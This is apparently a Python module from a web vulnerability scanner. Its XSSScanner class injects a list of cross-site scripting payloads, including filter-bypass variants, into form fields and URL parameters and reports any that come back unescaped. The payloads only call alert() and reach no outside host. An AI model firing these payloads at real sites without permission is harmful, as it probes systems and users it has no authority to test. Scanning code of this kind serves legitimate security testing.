import requests
from urllib.parse import urljoin
from colorama import Fore, Style

# XSS payloads — from basic to filter-bypass
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<script>alert(1)</script>",
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    "<body onload=alert(1)>",
    '"><img src=x onerror=alert(1)>',
    "<iframe src=javascript:alert(1)>",
    # Filter bypass variants
    "<ScRiPt>alert(1)</ScRiPt>",
    "<script >alert(1)</script >",
    "<%73cript>alert(1)</script>",
    "<svg/onload=alert(1)>",
    "\"><svg onload=alert(1)>",
]

class XSSScanner:
    def __init__(self, session=None):
        self.session = session or requests.Session()
        self.session.headers["User-Agent"] = "WebVulnScanner/1.0"
        self.vulnerabilities = []

    def is_vulnerable(self, response, payload):
        """Check if payload is reflected in the response (unescaped)."""
        content = response.content.decode(errors="ignore")
        return payload in content

    def scan_form(self, form, page_url):
        """Inject XSS payloads into each form field and check if reflected."""
        action     = form.get("action", "")
        method     = form.get("method", "get").lower()
        inputs     = form.get("inputs", [])
        target_url = urljoin(page_url, action) if action else page_url

        for payload in XSS_PAYLOADS:
            # Inject payload into all text-like fields
            data = {}
            for input_field in inputs:
                if input_field["name"] is None:
                    continue
                if input_field["type"] in ("text", "search", "email", "password", "url"):
                    data[input_field["name"]] = payload
                else:
                    data[input_field["name"]] = input_field["value"]

            try:
                if method == "post":
                    response = self.session.post(target_url, data=data, timeout=5)
                else:
                    response = self.session.get(target_url, params=data, timeout=5)

                if self.is_vulnerable(response, payload):
                    result = {
                        "type"    : "Cross-Site Scripting (XSS)",
                        "url"     : target_url,
                        "method"  : method.upper(),
                        "payload" : payload,
                    }
                    self.vulnerabilities.append(result)
                    print(f"{Fore.RED}[VULNERABLE]{Style.RESET_ALL} XSS found!")
                    print(f"  → URL     : {target_url}")
                    print(f"  → Method  : {method.upper()}")
                    print(f"  → Payload : {payload}\n")
                    break  # One confirmed hit per form is enough

                else:
                    print(f"{Fore.YELLOW}[TESTING]{Style.RESET_ALL} "
                          f"{target_url} | payload: {payload[:40]}")

            except Exception as e:
                print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} {e}")

    def scan_url_params(self, links):
        """Test XSS in URL parameters — deduplicated by base URL + param key."""
        print(f"\n{Fore.CYAN}[XSS]{Style.RESET_ALL} Testing URL parameters...")
    
        tested = set()  # Track (base_url, param_key) combos already tested
    
        for url in links:
            if "?" not in url:
                continue
            
            base, params = url.split("?", 1)
            param_pairs  = params.split("&")
    
            for pair in param_pairs:
                key = pair.split("=")[0]
                signature = f"{base}?{key}"  # e.g. Login.asp?RetURL
    
                if signature in tested:
                    continue  # Skip — already tested this param on this page
                tested.add(signature)
    
                for payload in XSS_PAYLOADS:
                    injected_url = f"{base}?{key}={payload}"
                    try:
                        response = self.session.get(injected_url, timeout=5)
                        if self.is_vulnerable(response, payload):
                            result = {
                                "type"    : "XSS - URL Parameter",
                                "url"     : injected_url,
                                "method"  : "GET",
                                "payload" : payload,
                            }
                            self.vulnerabilities.append(result)
                            print(f"{Fore.RED}[VULNERABLE]{Style.RESET_ALL} XSS in URL param!")
                            print(f"  → URL     : {injected_url}")
                            print(f"  → Payload : {payload}\n")
                            break
                        else:
                            print(f"{Fore.YELLOW}[TESTING]{Style.RESET_ALL} {key}={payload[:30]}")
                    except Exception as e:
                        print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} {e}")

    def scan(self, forms, links=None):
        """Scan all forms and optionally URL params for XSS."""
        print(f"\n{Fore.BLUE}{'='*50}")
        print(f"  XSS SCAN — {len(forms)} forms found")
        print(f"{'='*50}{Style.RESET_ALL}\n")

        if not forms:
            print("No forms to scan.")
        else:
            for form in forms:
                page_url = form.get("page_url", "")
                print(f"{Fore.CYAN}[FORM]{Style.RESET_ALL} Scanning form on: {page_url}")
                self.scan_form(form, page_url)

        # Also scan URL parameters if links provided
        if links:
            self.scan_url_params(links)

        return self.vulnerabilities